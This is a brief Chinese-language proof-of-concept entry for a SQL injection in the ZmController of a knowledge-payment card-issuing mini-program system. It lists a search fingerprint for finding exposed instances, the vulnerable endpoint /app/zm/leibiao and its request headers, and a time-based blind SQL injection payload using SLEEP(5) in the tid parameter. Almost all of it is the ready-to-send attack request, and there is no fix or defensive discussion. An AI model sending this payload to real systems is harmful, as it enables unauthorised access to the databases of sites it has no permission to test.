# 知识付费纯净发卡小程序系统存在前台ZmController存在SQL注入漏洞

- **系统**：知识付费纯净发卡小程序系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"域名/skdjfdf"`
- **请求**：`POST /app/zm/leibiao HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Type: application/x-www-form-urlencoded`　`Sec-Fetch-User: ?1`　`Cookie: PHPSESSID=q7pp0d3p3f5ileeqhnf8v5lnt1`　`Content-Length: 55`

**请求体 / payload**
```
tid=(CASE WHEN (3711=3711) THEN SLEEP(5) ELSE 3711 END)
```
- **预期**：200　|　—